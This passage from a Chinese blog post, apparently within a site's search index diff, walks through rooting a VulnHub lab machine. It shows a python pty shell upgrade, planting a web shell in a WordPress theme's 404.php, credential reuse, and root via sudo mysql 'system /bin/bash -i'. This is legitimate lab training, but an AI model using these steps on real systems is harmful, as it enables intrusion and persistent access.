+<p>提权获得的shell是残缺的，无法完成互动操作，比如修改代码，自动补齐。因此，接下来需要升级（以python get shell做示范。该方法只针对bash） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">2. ctrl+z 将获得的shell暂停，切到后台</span><br><span class="line">3. stty raw -echo</span><br><span class="line">4. fg 将刚刚放入后台的进程切到前台</span><br><span class="line">5. export SHELL=/bin/bash</span><br><span class="line">6. export TERM=screen</span><br><span class="line">7. stty rows 38 columns 116 设置大小</span><br><span class="line">8. reset</span><br><span class="line">9. shell成功升级</span><br><span class="line"></span><br><span class="line">注意：如果kali使用的是zsh，需要切换为bash。</span><br><span class="line">	1. chsh -s /bin/bash（不能加sudo，否则修改的是root的shell）</span><br><span class="line">	2. 重启</span><br><span class="line">	3. echo $SHELL 确认一下</span><br></pre></td></tr></table></figure></p>
+<p><strong>如果利用nc获得一个shell，容易不小心按ctrl+c或者某种原因退出了shell。并且，有的web程序不能多次触发漏洞反弹shell（可能触发一次后环境就变了，只能等待对方重启服务器）。因此，获得一个shell后，应该基于这个shell去获得2-3个shell，比如一句话木马</strong></p>
+<p>回想刚刚后台get shell的第二种方法，此时已经获得了shell，因此可以修改php文件（或者添加php文件）来用其他工具连接，比如蚁剑。</p>
+<p>这里修改主题里面的404.php文件，也就是刚刚修改不成功的那个。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403193531.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403202613.png" /></p>
+<p>成功连接</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403202630.png" /></p>
+<p>这就是为什么要进行shell升级，否则无法该代码，用蚁剑连接。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>发现了<code>/home</code>目录下有一个用户 wpadmin</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403193944.png" /></p>
+<p>并且在wpadmin的目录下，有一个txt文件，猜测这就是flag文件，但经过测试，现在的权限不够查看。</p>
+<p>还在<code>/root</code>目录下发现一个txt文件，这应该是另一个flag文件，但遗憾的是，还是没有权限。</p>
+<p>查看用户<code>cat /etc/passwd</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194131.png" /></p>
+<p>查看系统内核<code>uname -a</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194203.png" /></p>
+<p>查看sudo配置，发现权限不够。</p>
+<p>查看wordpress目录下的配置文件：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194406.png" /></p>
+<p>发现了数据库的名称，用户名和密码。</p>
+<p>信息收集差不多了，接下来就需要进行提权了。</p>
+<h2 id="权限提升">权限提升</h2>
+<h3 id="wpadmin权限">wpadmin权限</h3>
+<p>想起刚刚查看wordpress配置文件的时候发现了用户名和密码，因此尝试登录wpadmin试试，尝试失败。这时候想到，刚刚密码爆破还有一个密码，因此再次尝试，发现成功。密码是：adam14</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195257.png" /></p>
+<p>此时可以先读取第一个flag</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195341.png" /></p>
+<h3 id="root权限">root权限</h3>
+<p>（如果刚刚没有升级shell，这里无法连接数据库！！！） 刚刚发现得到了系统内核，用msf查找，发现没有漏洞可以利用。</p>
+<p>接下来查看sudo配置 <code>sudo -l</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195815.png" /></p>
+<p>发现，wpadmin可以以root权限启动数据库，因此，输入下面的命令启动数据库，经过尝试，密码也是adam14。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /urs/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195950.png" /></p>
+<p>成功登录数据库。</p>
+<blockquote>
+<p>小知识：数据库可以利用 system cmd 执行系统命令。这里我们是以root方式启动的数据库，因此使用system执行命令的时候也是root权限。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200101.png" /></p>
+<p>执行 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system /bin/bash -i</span><br><span class="line"></span><br><span class="line">-i 表示shell表示bash是交互的。其实这里不加也没关系</span><br></pre></td></tr></table></figure></p>
+<p>获得root权限的shell</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200246.png" /></p>
+<p>成功拿到flag，也成功得到root权限。至此，这个靶机结束！</p>
+<h1 id="总结">总结</h1>
+<p>通过对该靶机的渗透，学到了MySQL的提权方式，对该靶机来说，归根结底还是sudo配置不当。</p>
+<p>其次，知道了如果请求一个网页反应慢，可能是因为后台源码请求某个IP地址，该IP地址在原来的环境下是靶机的IP内网IP地址，所以在原来的环境下请求速度正常，但是一旦移植到自己的环境，比如虚拟机，那么就会出问题。此时，就可以利用BP的自动替换，将代码中写死的IP地址改为当前靶机的IP地址。</p>
+<p>最后，就是学习了如何将“残缺的”shell升级为交互式的shell。</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>MySQL提取</tag>
+        <tag>shell升级</tag>
+        <tag>BP自动替换</tag>
       </tags>
   </entry>
 </search>
